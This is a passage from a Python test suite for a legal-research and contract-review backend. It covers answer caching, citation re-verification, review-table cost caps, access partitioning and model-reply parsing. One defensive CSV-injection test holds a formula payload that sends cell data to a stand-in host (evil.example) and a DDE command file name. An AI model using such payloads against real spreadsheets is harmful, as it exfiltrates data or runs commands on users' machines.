    from checker import answer_cache as _ac
    _o9 = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30", actor="a" * 8,
                  model_for=lambda _o: _rq.quoting_model(_srcs))
    _a1 = by_name()["ask"].run({"question": _q}, _o9)
    check(_a1.get("status") == "ANSWERED" and not _a1.get("cached"),
          f"the first ask is answered and NOT cached ({_a1.get('status')})")
    _a2 = by_name()["ask"].run({"question": _q}, _o9)
    check(_a2.get("cached") is True,
          "the second ask of the SAME question is served from the cache")
    check(_a2.get("answer") == _a1.get("answer")
          and [c["id"] for c in _a2.get("citations") or []]
              == [c["id"] for c in _a1.get("citations") or []],
          "...with the same answer and the same citations")
    check(_a1.get("run_id") and "run_id" not in _a2
          and _a1["run_id"] not in str(_o9.store.cache),
          "a cached answer never carries the run id of the ask that stored it")
    check("re-verifies" in str(_a2.get("cache_note")),
          f"...and the note says the citations were RE-READ, not that it was recent "
          f"({str(_a2.get('cache_note'))[:50]!r})")
    _s1 = cache_stats(_o9)
    check(_s1["hits"] == 1 and _s1["misses"] == 1 and _s1["hit_rate"] == 0.5,
          f"**the hit rate is reported** ({_s1['hit_rate']})")

    # Asking it differently is the same question; asking a different one is not.
    by_name()["ask"].run({"question": "  what is the QUORUM for a meeting of the Board "},
                         _o9)
    check(cache_stats(_o9)["hits"] == 2,
          "case and surrounding space do not make a new question")
    by_name()["ask"].run({"question": "How many Board meetings must be held each year?"},
                         _o9)
    check(cache_stats(_o9)["misses"] == 2,
          "...while a different question misses, rather than being served the first "
          "answer")
    # 028. Reuse stays inside who could read the original: a colleague asking the same
    # words unfiled misses, so a hit is never an oracle for someone else's question.
    from dataclasses import replace as _replace
    _other = _replace(_o9, actor="b" * 8)
    check(not by_name()["ask"].run({"question": _q}, _other).get("cached"),
          "**another actor's identical unfiled question is a MISS**, not their answer")
    _in_m = by_name()["ask"].run({"question": _q}, _replace(_o9, matter_id="m1"))
    check(not _in_m.get("cached")
          and by_name()["ask"].run({"question": _q},
                                   _replace(_other, matter_id="m1")).get("cached") is True,
          "...while inside ONE matter its members share entries, and outside it nobody does")
    check(not by_name()["ask"].run({"question": _q}, _replace(_o9, actor="unknown")).get("cached"),
          "...and a caller with no actor is never served or stored an entry")

    # ── THE GATE: a stored answer whose law moved is NOT served ─────────────
    _stale_ctx = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                         actor="a" * 8, model_for=lambda _o: _rq.quoting_model(_srcs))
    by_name()["ask"].run({"question": _q}, _stale_ctx)
    _key = _ac.lookup_key(question=_q, task="RESEARCH_QUESTION", as_of="2026-10-01",
                          partition="actor:" + "a" * 8)
    _row = _stale_ctx.store.read_cache_entry(_key)
    check(_row is not None, "the answer was stored")
    # Rewrite the stored citation's sha256: the corpus file no longer hashes to it, which
    # is exactly what a real amendment to the section would do.
    _moved = [dict(c, sha256="0" * 64) for c in _row["citations"]]
    _stale_ctx.store.write_cache_entry(dict(_row, citations=_moved,
                                            content_key=_ac.content_key(
                                                _key, _ac.provision_hashes(_moved))))
    _a3 = by_name()["ask"].run({"question": _q}, _stale_ctx)
    check(not _a3.get("cached"),
          "**a stored answer whose cited provision has CHANGED is not served** -- the "
          "question is answered again")
    _s2 = cache_stats(_stale_ctx)
    check(_s2["stale"] == 1,
          f"...and it is counted as STALE, apart from a miss: the law moved, which is not "
          f"a cache fault ({_s2})")
    check("corpus change and not a cache fault" in _s2["note"],
          "...and the note says so, because that number is what shows the re-verification "
          "gate does anything")

    # ── what is never cached ───────────────────────────────────────────────
    _nf = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=lambda _o: _rq.quoting_model(_srcs))
    by_name()["ask"].run({"question": _q, "company_facts": {"paid_up_capital": "1"}}, _nf)
    check(_nf.store.read_cache_stats()["hits"] + _nf.store.read_cache_stats()["misses"]
          == 0,
          "an ask carrying COMPANY FACTS is not looked up at all: the key does not carry "
          "the facts, so a hit would serve one company's answer to another's question")
    check("no store" in cache_stats(Context())["error"],
          "the hit rate with no store says so rather than reporting a rate of nothing")
    check(_ac.Stats().to_dict()["hit_rate"] is None,
          "...and an unqueried cache has NO rate, which is not a rate of zero")
    check("cache.stats" not in {v.name for v in VERBS},
          "the hit rate is NOT a verb: every read-only verb becomes an MCP tool with no "
          "opt-out, and a cache hit rate is an operator's number, not an agent capability")

    # ── job 3c: the model writes the prose, and the same rule judges it ────
    # Stubs only. The gate never calls a model: a suite that needed one would be a suite
    # that fails when the region is unconfirmed, which is most of the time.
    from checker import draft_prose as _dp
    from checker import draft_templates as _dtpl
    _FAKE3C = "Section 42 of the Companies Act requires a special resolution for this."

    def _fabricating(_origins):
        return lambda prompt: ("1. This note sets out what was found. [c1]\n"
                               f"2. {_FAKE3C}\n")

    # The research turn needs the REAL quoting model so its citations name the corpus file
    # they were read from; only the DRAFT turn is served by the fabricating stub. Reusing
    # one stub for both produced citations with no source, and the prose was then refused
    # for having nothing to clear -- a fixture fault that read exactly like a real one.
    _p3 = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00",
                  model_for=lambda _o: _rq.quoting_model(_srcs))
    _b3, _n3 = _draft_prose("research_memo", _src,
                            Context(store=_MB(), model_for=_fabricating))
    check(_n3 == "" and len(_b3) == 2,
          f"the prose writer returns the model's sentences ({_n3[:40]!r})")
    check(_dp.build_prompt("research_memo", _src).count("<source") >= 1,
          "...from a prompt whose quotes sit in DELIMITED blocks, each cleared against "
          "the corpus file it was read from")
    check(_q not in _dp.build_prompt("client_email", {"findings": [
              {"rule_id": "R", "clause": "C", "kind": "POTENTIAL_ISSUE", "detail": "d"}]}),
          "...and the user's message is not in the prompt: the model is shown findings, "
          "so it can only write about findings")

    # End to end: the model's fabricated law is dropped by the SAME admit rule.
    _p3.documents.update(_cctx2.documents)
    _pr1 = by_name()["conversation.send"].run({"text": _q}, _p3)
    _pcid = _pr1["conversation_id"]
    _p3.model_for = _fabricating        # from here, the stub writes the prose
    if _draft_source(_pcid, _p3)[0] is None:
        check(False, "a stub-served research turn is a memo source")
    else:
        _pr2 = by_name()["conversation.send"].run(
            {"conversation_id": _pcid, "text": "Draft a memo for the file about this."},
            _p3)
        check(_pr2.get("prose_note") == "",
              f"prose was written, so there is no note ({_pr2.get('prose_note')!r})")
        check(len(_pr2.get("dropped_claims") or []) == 1,
              f"**the MODEL's uncited legal claim is DROPPED** end to end "
              f"({len(_pr2.get('dropped_claims') or [])})")
        _pv = by_name()["draft.versions"].run(
            {"draft_id": _pr2["draft_id"]}, _p3)["versions"][0]
        check(_FAKE3C not in _pv["body"]
              and all(_FAKE3C not in (sl.get("value") or "") for sl in _pv["slots"]),
              "...and is in no part of the stored version")
        check(any(sl["type"] == "MODEL_SUGGESTION" and sl["blocks_approval"]
                  for sl in _pv["slots"]),
              "...while the surviving sentence BLOCKS approval, so no model-written draft "
              "is approvable without a person")

    # A model that raises gives the note and a draft that still stands.
    def _exploding(_origins):
        def boom(prompt):
            raise TimeoutError("the deployment did not answer")
        return boom

    _b4, _n4 = _draft_prose("research_memo", _src,
                            Context(store=_MB(), model_for=_exploding))
    check(_b4 == [] and _n4.startswith(_dp.NO_PROSE_PREFIX) and "TimeoutError" in _n4,
          f"**a model that RAISES gives 'prose not generated', not FAILED** ({_n4[:50]!r})")
    _still = _dtpl.research_memo(_src, prose=_b4)
    check(any(s.slot_type == "SOURCE_QUOTE" for s in _still.slots),
          "...and the draft is still built from the run's citations")

    # The email's facts are MATTER, so D3 decides whether it can have prose at all.
    check(_dp.sensitivity_of("client_email") == _dp.MATTER
          and _dp.sensitivity_of("research_memo") == _dp.PUBLIC,
          "an email's facts are client data and a memo's are corpus quotes -- which is "
          "why one of them can be refused on residency while the other is not")

    # The email template, from a real review_contract run in the same thread.
    _ectx = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00", synthetic_fixtures=True)
    _rc = by_name()["conversation.send"].run(
        {"text": "Please review this contract against our standard.",
         "task_override": "REVIEW_CONTRACT", "test_data": "fixture"}, _ectx)
    _ecid = _rc["conversation_id"]
    _et, _es, _erid = _draft_source(_ecid, _ectx)
    if _et is None:
        check(False, f"a REVIEW_CONTRACT turn is an email's source run "
                     f"(got none; run={_rc.get('run_id')})")
    else:
        check(_et == "client_email", f"a REVIEW_CONTRACT turn is an email's source ({_et})")
        _er = by_name()["conversation.send"].run(
            {"conversation_id": _ecid,
             "text": "draft an email to the client about this review",
             "prose": [{"text": "Clause 4 is void for want of consideration.",
                        "citation_ids": []}]}, _ectx)
        check(_er["envelope"]["task"] == "DRAFT" and _er.get("template") == "client_email",
              f"...and the user's own words reach the email template "
              f"({_er['envelope']['task']}/{_er.get('template')})")
        check(len(_er.get("dropped_claims") or []) == 1,
              "...where an uncited 'is void' claim is dropped by the same rule")
        _ev1 = by_name()["draft.versions"].run(
            {"draft_id": _er["draft_id"]}, _ectx)["versions"][0]
        check(not any(sl["type"] == "SOURCE_QUOTE" for sl in _ev1["slots"]),
              "...and the email states NO law, because a contract review holds none")
        check("not statements of law" in _ev1["body"],
              "...and says so in the stored body, where a forward carries it")

    # ── citation.get re-reads; it does not trust the stored envelope ────────
    _cg = by_name()["citation.get"].run(
        {"citation_id": _c1["id"], "conversation_id": _cr["conversation_id"]}, _cctx2)
    check(_cg.get("reverified") is True and "byte-matches" in _cg["reverified_note"],
          f"citation.get re-reads the corpus and says so ({_cg.get('reverified')})")
    check(_cg["citation"]["quote"] == _c1["quote"],
          "...returning the citation in full for the source panel")
    # A bent citation that somehow IS stored must come back marked, not presented as good.
    _st2 = _cctx2.store
    _mid = [m for m in _st2.read_messages(_cr["conversation_id"])
            if m["role"] == "assistant"][0]["message_id"]
    _st2.set_message_envelope(_mid, dict(_ce, citations=[_bent]))
    _cg2 = by_name()["citation.get"].run(
        {"citation_id": "bent", "conversation_id": _cr["conversation_id"]}, _cctx2)
    check(_cg2.get("reverified") is False and "NOT present" in _cg2["reverified_note"],
          f"a bent citation found in a STORED envelope is returned marked "
          f"reverified=false, never as a good one ({_cg2.get('reverified')})")
    check("nothing may rest on it" in _cg2["note"],
          "...and the note says what that means")

    # ══ H4: review_table.create / .status / .export ══════════════════════════
    from checker import review_grid as _rg
    from gateway.jobs import MemoryQueue as _MQ2
    # A tenant, because review_table.create reserves each cell against the firm's cap and
    # a context naming no firm is refused (backend/budget.py `attributed`).
    _hctx = Context(tenant="gate-firm", store=_MB(), queue=_MQ2(),
                    clock=lambda: "2026-10-01T00:00:00+00:00")
    _hV = by_name()
    _d1 = _hV["documents.upload"].run(
        {"text": "MUTUAL NDA\n3. Governed by the laws of India.\n", "name": "nda.txt"},
        _hctx)["document_id"]
    _d2 = _hV["documents.upload"].run(
        {"text": "SUPPLY AGREEMENT with no governing law clause.\n", "name": "supply.txt"},
        _hctx)["document_id"]
    _cols = [{"name": "governing law", "kind": "text", "question": "Which law governs?"},
             {"name": "term end", "kind": "date", "question": "When does it expire?"}]

    # write verbs stay off MCP
    for _wv in ("review_table.create",):
        check(_wv in write_verbs() and f"{MCP_NAMESPACE}.{_wv}" not in {t.name for t in mcp},
              f"{_wv} WRITES and is kept off MCP by mcp_tools()")
    for _rv in ("review_table.status", "review_table.export"):
        check(_rv not in write_verbs()
              and f"{MCP_NAMESPACE}.{_rv}" in {t.name for t in mcp},
              f"{_rv} is read-only and reaches MCP")

    _cr = _hV["review_table.create"].run(
        {"name": "NDA diligence", "document_ids": [_d1, _d2], "columns": _cols}, _hctx)
    check(_cr.get("cells") == 4 and len(_cr["scheduled"]["enqueued"]) == 4,
          f"create materialises 4 cells and enqueues one job per cell ({_cr.get('cells')})")
    check(_cr["estimated_cost_inr"] is None and "UNPRICED" in _cr["cost_note"],
          "...and the cost is UNPRICED, not a number: every cell is a call that has not "
          "happened, and a figure would be a guess wearing a currency symbol")
    _gid = _cr["grid_id"]

    # ── the cost guard, before anything is enqueued ─────────────────────────
    _big = _hV["review_table.create"].run(
        {"name": "too big", "document_ids": [("%064x" % i) for i in range(101)],
         "columns": _cols * 3}, _hctx)
    check(_big.get("code") == "GRID_TOO_LARGE",
          f"a grid above the cap is REFUSED ({_big.get('code')})")
    check("606 cells" in _big["detail"] and str(MAX_GRID_CELLS) in _big["detail"],
          f"...and the refusal names the CELL COUNT and the CAP ({_big['detail'][:70]})")
    check("separate run" in _big["detail"] or "separate model call" in _big["detail"],
          "...and says why a big table is a bill and a queue depth, not just a big table")
    _before = len(_MQ2().__dict__.get("jobs", []) or [])
    _q3 = _MQ2()
    _hctx3 = Context(tenant="gate-firm", store=_MB(), queue=_q3, clock=lambda: "2026-10-01T00:00:00+00:00")
    _hV["review_table.create"].run(
        {"name": "too big", "document_ids": [("%064x" % i) for i in range(101)],
         "columns": _cols * 3}, _hctx3)
    check(_hctx3.store.read_grid_cells("x") == [] and not getattr(_q3, "jobs", []),
          "...and NOTHING was enqueued: a half-enqueued grid bills the user for the part "
          "that ran and leaves them without a table")
    check(MAX_GRID_CELLS == 500, f"the cap is a declared number ({MAX_GRID_CELLS})")
    _exact = _hV["review_table.create"].run(
        {"name": "at the cap", "document_ids": [("%064x" % i) for i in range(250)],
         "columns": _cols}, Context(tenant="gate-firm", store=_MB(), queue=_MQ2(), documents={
             ("%064x" % i): {"text": "synthetic"} for i in range(250)}))
    check(_exact.get("cells") == 500, f"a grid exactly AT the cap is allowed ({_exact.get('cells')})")

    # ── bad input ───────────────────────────────────────────────────────────
    for _bad, _why in (({"name": "", "document_ids": [_d1], "columns": _cols}, "no name"),
                       ({"name": "n", "document_ids": [], "columns": _cols}, "no documents"),
                       ({"name": "n", "document_ids": [_d1], "columns": []}, "no columns"),
                       ({"name": "n", "document_ids": [_d1],
                         "columns": [{"name": "c", "kind": "colour", "question": "q?"}]},
                        "an unknown column kind"),
                       ({"name": "n", "document_ids": [_d1],
                         "columns": [{"name": "c", "kind": "text", "question": ""}]},
                        "a column with no question")):
        _r = _hV["review_table.create"].run(_bad, Context(tenant="gate-firm", store=_MB(), queue=_MQ2()))
        check(_r.get("status") == "REFUSED", f"create refuses {_why} ({_r.get('code')})")
    check(_hV["review_table.create"].run(
              {"name": "n", "document_ids": [_d1], "columns": _cols},
              Context(tenant="gate-firm"))["code"] == "NO_STORE",
          "create with no store is refused: a review table is durable work")

    # ── status: PENDING is not a finding ────────────────────────────────────
    _st = _hV["review_table.status"].run({"grid_id": _gid}, _hctx)
    check(_st["cells"] == 4 and _st["findings"] == 0 and not _st["complete"],
          f"a fresh grid has 4 cells and 0 FINDINGS ({_st['findings']}/{_st['cells']})")
    check(_st["by_state"]["PENDING"] == 4, "...all four PENDING")
    check(len(_st["cells_detail"]) == 4, "...and every cell is listed")
    check(_hV["review_table.status"].run({"grid_id": "nope"}, _hctx)["code"] == "NOT_FOUND",
          "an unknown grid is NOT_FOUND, never an empty table")

    # ── 034: each document's file NAME is stored with the table ─────────────
    check(_st.get("document_names") == {_d1: "nda.txt", _d2: "supply.txt"},
          f"status names each document by the file name it was created with "
          f"({_st.get('document_names')})")
    _vsha = "c" * 64
    _vstore = _MB()
    _vctx = Context(tenant="gate-firm", store=_vstore, queue=_MQ2(),
                    clock=lambda: "2026-10-01T00:00:00+00:00")
    _vstore.write_vault_document({"document_id": "00000000-0000-0000-0000-0000000000f1",
                                  "sha256": _vsha, "name": "  Lease 2024.pdf ",
                                  "uploaded_by": _vctx.actor})
    _vg = _hV["review_table.create"].run(
        {"name": "lease", "document_ids": [_vsha],
         "columns": [{"name": "rent", "kind": "amount", "question": "What is the rent?"}]},
        _vctx)["grid_id"]
    check(_vstore.read_grid(_vg).get("document_names") == {_vsha: "Lease 2024.pdf"},
          "a vault document's name is read from the vault at create time and STORED on the "
          "table, so reopening it in another browser still shows the file name")
    # A later page load: a fresh context with nothing uploaded in this process.
    _reopen = Context(tenant="gate-firm", store=_vstore, queue=_MQ2(), actor=_vctx.actor)
    check(_hV["review_table.status"].run({"grid_id": _vg}, _reopen)
          .get("document_names") == {_vsha: "Lease 2024.pdf"},
          "...and status returns it from the store, not from this process's uploads")
    check("Lease 2024.pdf" in _hV["review_table.export"].run({"grid_id": _vg}, _reopen)["csv"],
          "...and the CSV uses the stored name rather than the sha256")
    _old = "00000000-0000-0000-0000-0000000000f2"
    _vstore.write_grid({"grid_id": _old, "name": "made before 034", "actor_id": _vctx.actor,
                        "columns": [{"name": "rent", "kind": "amount",
                                     "question": "What is the rent?"}],
                        "document_ids": [_vsha]})
    check(_hV["review_table.status"].run({"grid_id": _old}, _reopen)
          .get("document_names") == {},
          "a table stored with no names reads an EMPTY map, so the page falls back as before")

    # ── review_table.list: the firm's tables, not this browser's ───────────
    _lv = _hV["review_table.list"]
    check(_lv.read_only and not _lv.mcp and "review_table.list" not in write_verbs(),
          "review_table.list is read-only and kept off MCP, like matters.list: table names "
          "can name a client")
    _ls = _lv.run({}, _hctx)
    _mine = [t for t in _ls["tables"] if t["grid_id"] == _gid]
    check(len(_mine) == 1 and _mine[0]["name"] == "NDA diligence"
          and _mine[0]["table_state"] == "RUNNING" and _mine[0]["mine"]
          and (_mine[0]["documents"], _mine[0]["columns"], _mine[0]["cells"],
               _mine[0]["cells_pending"]) == (2, 2, 4, 4)
          and _mine[0]["created_at"] and _mine[0]["created_by"] == _hctx.actor,
          f"list names the table, its state, its counts and who started it ({_mine})")
    check("Which law governs" not in str(_ls) and "India" not in str(_ls),
          "...and carries no question text and no answer")
    _colleague = Context(store=_hctx.store, queue=_hctx.queue,
                         actor="00000000-0000-0000-0000-00000000c0c0",
                         tenant=_hctx.tenant)
    check(_gid not in {t["grid_id"] for t in _lv.run({}, _colleague)["tables"]},
          "a colleague with no grant on an unfiled table does not see it listed -- the "
          "same rule review_table.status applies (028)")
    check(_hV["review_table.status"].run({"grid_id": _gid}, _colleague)["code"]
          == "NOT_FOUND", "...and its page refuses them too, so list and page agree")
    _firm_b = Context(store=_MB(), queue=_MQ2(), actor=_hctx.actor, tenant="firm-b")
    check(_lv.run({}, _firm_b)["tables"] == [],
          "another firm's store lists none of this firm's tables (Postgres: "
          "scripts/review_table_list_integration.py proves it under row-level security)")
    for _g2 in ("Lease basics", "Third table"):
        _hV["review_table.create"].run(
            {"name": _g2, "document_ids": [_d1], "columns": _cols[:1]}, _hctx)
    _p1 = _lv.run({"limit": "2"}, _hctx)
    _p2 = _lv.run({"limit": "2", "cursor": _p1["next_cursor"]}, _hctx)
    check([t["name"] for t in _p1["tables"]] == ["Third table", "Lease basics"]
          and _p1["next_cursor"] and [t["name"] for t in _p2["tables"]] == ["NDA diligence"]
          and _p2["next_cursor"] is None,
          f"newest first, paged by an opaque cursor ({[t['name'] for t in _p1['tables']]})")
    for _bad in ({"limit": "0"}, {"limit": "51"}, {"limit": "x"}, {"cursor": "not-a-cursor"}):
        check(_lv.run(_bad, _hctx).get("code") == "BAD_REQUEST", f"list refuses {_bad}")
    check(_lv.run({}, Context())["code"] == "NO_STORE", "list with no store is refused")

    # Answer two cells, one FOUND and one NOT_FOUND. One priced, one UNPRICED, so the
    # running total below has both kinds to deal with.
    _hctx.store.write_grid_cell({"grid_id": _gid, "document_id": _d1,
                                 "column_name": "governing law", "state": "FOUND",
                                 "value": "India",
                                 "quote": "Governed by the laws of India",
                                 "provider": "azure", "cost_inr": 0.0412,
                                 "cost_note": "priced from reported tokens"})
    _hctx.store.write_grid_cell({"grid_id": _gid, "document_id": _d2,
                                 "column_name": "governing law", "state": "NOT_FOUND",
                                 "reason": "the agreement names no governing law at all",
                                 "provider": "azure", "cost_inr": None,
                                 "cost_note": "UNPRICED: no verified price for this "
                                              "deployment"})
    _st2 = _hV["review_table.status"].run({"grid_id": _gid}, _hctx)
    check(_st2["findings"] == 2 and _st2["by_state"]["PENDING"] == 2,
          f"two answers are two findings; the unrun cells stay PENDING ({_st2['findings']})")

    # ── the running total, and what it refuses to pretend ──────────────────
    _sp = _st2["spend"]
    check(_sp["total_inr"] == 0.0412 and _sp["priced_cells"] == 1,
          f"**.status carries the grid's running total** ({_sp['total_inr']})")
    check(_sp["unpriced_cells"] == 1 and _sp["pending_cells"] == 2,
          f"...with the cells it does NOT include, counted separately "
          f"({_sp['unpriced_cells']} unpriced, {_sp['pending_cells']} pending)")
    check(_sp["is_lower_bound"] and "HIGHER" in _sp["note"],
          "...and it says in words that the true figure is higher, because a total that "
          "quietly dropped an UNPRICED call would read as the bill")
    check("0" not in str(_sp["unpriced_cells"]) or _sp["total_inr"] != 0,
          "...and the UNPRICED cell contributed nothing rather than being counted as 0.00")
    _fresh = _hV["review_table.status"].run(
        {"grid_id": _hV["review_table.create"].run(
            {"name": "unrun", "document_ids": [_d1],
             "columns": [{"name": "c", "kind": "text", "question": "q?"}]},
            _hctx)["grid_id"]}, _hctx)["spend"]
    check(_fresh["total_inr"] is None and _fresh["note"].startswith("UNPRICED"),
          f"a table where nothing has run has NO total -- UNPRICED, not Rs.0.00 "
          f"({_fresh['total_inr']!r})")

    # ── export: words in every cell, and no formula can run ────────────────
    _ex = _hV["review_table.export"].run({"grid_id": _gid}, _hctx)
    import csv as _csv, io as _io
    _rows = [r for r in _csv.reader(_io.StringIO(_ex["csv"]))]
    check(_rows[0] == ["document", "governing law", "term end"],
          f"the header is the document plus each column ({_rows[0]})")
    check(any("nda.txt" in r[0] for r in _rows[1:]),
          "a document renders by NAME, not by its sha256")
    _empty = [(i, j) for i, r in enumerate(_rows[1:], 1)
              for j, v in enumerate(r) if not str(v).strip()]
    check(not _empty, f"no exported cell is empty ({_empty})")
    check("NOT FOUND" in _ex["csv"] and "PENDING" in _ex["csv"],
          "...and NOT FOUND and PENDING read differently")
    check(_ex["filename"].endswith(".csv") and _ex["content_type"] == "text/csv",
          f"the export names a filename and a content type ({_ex['filename']})")
    check(_ex["findings"] == 2 and _ex["cells"] == 4,
          "...and reports findings separately from cells")

    # CSV injection, end to end through the verb.
    _evil = _hV["documents.upload"].run(
        {"text": "NDA\n=HYPERLINK(\"http://evil.example/?\"&A1,\"x\") governs.\n",
         "name": "=cmd|'/c calc'!A1.docx"}, _hctx)["document_id"]
    _eg = _hV["review_table.create"].run(
        {"name": "evil", "document_ids": [_evil],
         "columns": [{"name": "governing law", "kind": "text",
                      "question": "Which law governs?"}]}, _hctx)["grid_id"]
    _hctx.store.write_grid_cell(
        {"grid_id": _eg, "document_id": _evil, "column_name": "governing law",
         "state": "FOUND", "value": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\")",
         "quote": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\") governs",
         "cost_note": "no billed call: written directly by this suite"})
    _ec = _hV["review_table.export"].run({"grid_id": _eg}, _hctx)["csv"]
    check(not any(v.startswith(("=", "+", "@")) for r in _csv.reader(_io.StringIO(_ec))
                  for v in r),
          "no exported value can run as a formula -- the cell value AND the filename are "
          "both guarded")
    check("'=HYPERLINK" in _ec, "...the guard is a single leading quote, verbatim after it")
    check(_rg.csv_safe("-50000") == "'-50000",
          "a negative amount is guarded too, and exports as text -- a number that reads "
          "oddly beats an export that runs")

    # ══ H4 END TO END: the worker actually drains a grid ═════════════════════
    # Required by job 2b. Not a unit test of the runner -- the real queue, the real worker
    # loop, the real store, and the real verbs.
    import csv as _csv2, io as _io2
    from gateway.jobs import MemoryQueue as _Q
    from gateway.worker import run_one as _run_once
    from gateway import worker as _wk

    _DOCS = {
        "a" * 64: "NDA ONE. 3. Governed by the laws of India. 4. Expires 2029-03-31.",
        "b" * 64: "NDA TWO. 3. Governed by the laws of Singapore. 4. No expiry stated.",
        "c" * 64: "SUPPLY AGREEMENT. No governing law clause appears anywhere.",
    }

    def _answerer(_origins=None):
        """A deterministic cell answerer, injected as ctx.model_for would inject a model."""
        def answer(question, kind, text):
            q = question.lower()
            if "law" in q and "govern" in q:
                for seat in ("India", "Singapore"):
                    if f"laws of {seat}" in text:
                        return (seat, f"Governed by the laws of {seat}")
                return None
            if "expire" in q:
                import re as _re
                m = _re.search(r"\d{4}-\d{2}-\d{2}", text)
                return (m.group(0), f"Expires {m.group(0)}") if m else None
            return None
        return answer

    _e2e = Context(tenant="gate-firm", store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
                   model_for=_answerer)
    for _sha, _txt in _DOCS.items():
        _e2e.documents[_sha] = {"sha256": _sha, "name": f"{_sha[:4]}.txt",
                                "text": _txt, "bytes": len(_txt)}
    _eV = by_name()
    _made = _eV["review_table.create"].run(
        {"name": "NDA diligence", "document_ids": list(_DOCS),
         "columns": [{"name": "governing law", "kind": "text",
                      "question": "Which law governs this agreement?"},
                     {"name": "term end", "kind": "date",
                      "question": "On what date does it expire?"}]}, _e2e)
    _gid = _made["grid_id"]
    check(_made["cells"] == 6 and len(_made["scheduled"]["enqueued"]) == 6,
          f"a 3x2 table queues 6 cells ({_made['cells']})")
    check(_eV["review_table.status"].run({"grid_id": _gid}, _e2e)["by_state"]["PENDING"]
          == 6, "...and all six start PENDING")

    # THE WORKER DRAINS IT. The real loop, one job at a time, until the queue is empty.
    _handlers = queue_handlers(_e2e)
    _drained = 0
    for _ in range(20):
        _oc = _run_once(queue=_e2e.queue, store=_e2e.store, handlers=_handlers,
                        worker="w1")
        if _oc is None:
            break
        _drained += 1
    check(_drained == 6, f"the worker drained exactly 6 jobs ({_drained})")

    # ── an UNREADABLE model reply becomes NEEDS_LAWYER, never NOT_FOUND ────
    # Through the REAL parser the served path uses, with the model's words as the input.
    from agents.review_grid import Unreadable as _Unread
    check(_parse_cell_reply("VALUE: 3 years\nQUOTE: for a period of three years")
          == ("3 years", "for a period of three years"),
          "the two-line format parses to a value and its quote")
    check(_parse_cell_reply("VALUE: NONE\nQUOTE: ") is None,
          "...and an explicit NONE is None, which is the only route to NOT_FOUND")
    for _bad, _why in (
            ("The document says the term is three years.", "a prose reply"),
            ('{"value": "3 years", "quote": "three years"}', "a JSON reply"),
            ("I'm sorry, I can't help with that.", "a refusal in prose"),
            ("", "an empty reply"),
            ("VALUE:   \nQUOTE: something", "a VALUE: line with nothing on it")):
        try:
            _got = _parse_cell_reply(_bad)
            check(False, f"{_why} raises rather than returning {_got!r} -- returning None "
                         f"is what made this an ABSENCE")
        except _Unread:
            check(True, f"{_why} is Unreadable, NOT None")

    # And end to end, as a cell: the model answers in prose about a document it read.
    def _prose_model(_origins):
        def answer(question, kind, text):
            return _parse_cell_reply("The agreement is governed by Indian law, clause 14.")
        return answer

    _pctx = Context(tenant="gate-firm", store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
                    model_for=_prose_model)
    _pd = list(_DOCS)[0]
    _pctx.documents[_pd] = {"sha256": _pd, "name": "p.txt", "text": _DOCS[_pd],
                            "bytes": len(_DOCS[_pd])}
    _pg = by_name()["review_table.create"].run(
        {"name": "garbled", "document_ids": [_pd],
         "columns": [{"name": "governing law", "kind": "text",
                      "question": "Which law governs this agreement?"}]}, _pctx)["grid_id"]
    _ph = queue_handlers(_pctx)
    _run_once(queue=_pctx.queue, store=_pctx.store, handlers=_ph, worker="w1")
    _pcell = by_name()["review_table.status"].run({"grid_id": _pg}, _pctx)["cells_detail"][0]
    check(_pcell["state"] == "NEEDS_LAWYER",
          f"a model that answers in PROSE gives NEEDS_LAWYER end to end "
          f"({_pcell['state']})")
    check(_pcell["state"] != "NOT_FOUND",
          "...and NOT NOT_FOUND: the document was read and described, and the old parser "
          "turned that into 'this clause is absent'")
    check("unreadable model reply" in _pcell["reason"],
          f"...with the reason naming it ({_pcell['reason'][:46]!r})")
    check("COULD NOT RUN" not in by_name()["review_table.export"].run(
              {"grid_id": _pg}, _pctx)["csv"],
          "...and it does not export as COULD NOT RUN either, which is FAILED's label: "
          "the call ran")

    # ── THE LEDGER: one debit per cell, read from run_steps ────────────────
    # A cell is a run (`run_id_for_cell` is a uuid5 of its key), so the ledger entry for a
    # cell is its run's step. Read back from the store, not counted from the handler's
    # return: the question is what was PERSISTED.
    from agents.review_grid import run_id_for_cell as _rid
    _entries = []
    for _d in _DOCS:
        for _c in ("governing law", "term end"):
            _run = _e2e.store.read_run(_rid(_gid, _d, _c)) or {}
            _entries += [st for st in (_run.get("steps") or ())
                         if st.get("capability") == "review_grid.cell"]
    check(len(_entries) == 6,
          f"**a 6-cell grid records 6 LEDGER ENTRIES**, one per cell ({len(_entries)})")
    check(all(st.get("cost_note") for st in _entries),
          "...and every one says what it cost or why there is no number")
    check(all(st.get("cost_inr") is None for st in _entries),
          "...here all None, because a stub answerer served them: no billed call was made")
    check(all("not a cost of zero" in st["cost_note"] for st in _entries),
          f"...and each note SAYS that is not a cost of zero "
          f"({_entries[0]['cost_note'][:46]!r})")
    _cellrows = _e2e.store.read_grid_cells(_gid)
    check([r for r in _cellrows if r["cost_note"]] and len(_cellrows) == 6,
          "...and the same note is on the CELL, which is what .status adds up")
    check({st["cost_note"] for st in _entries}
          == {r["cost_note"] for r in _cellrows},
          "...identically: the step and the cell are built from ONE debit, so the two "
          "records cannot drift apart")

    _st = _eV["review_table.status"].run({"grid_id": _gid}, _e2e)
    check(_st["spend"]["total_inr"] is None and _st["spend"]["unpriced_cells"] == 6,
          f"...and a table of unbilled cells has NO total, with all 6 counted as unpriced "
          f"({_st['spend']['total_inr']!r})")
    check(_st["complete"], f"**.status shows the table COMPLETE** ({_st['by_state']})")
    check(_st["by_state"]["PENDING"] == 0, "...no cell is left PENDING")
    check(_st["by_state"]["FAILED"] == 0,
          f"...and no cell FAILED: FAILED is transport only and nothing broke "
          f"({_st['by_state']})")
    _terminal = {"FOUND", "NOT_FOUND", "NEEDS_LAWYER"}
    _states = {c["state"] for c in _st["cells_detail"]}
    check(_states <= _terminal,
          f"**every cell ended FOUND / NOT_FOUND / NEEDS_LAWYER** ({sorted(_states)})")
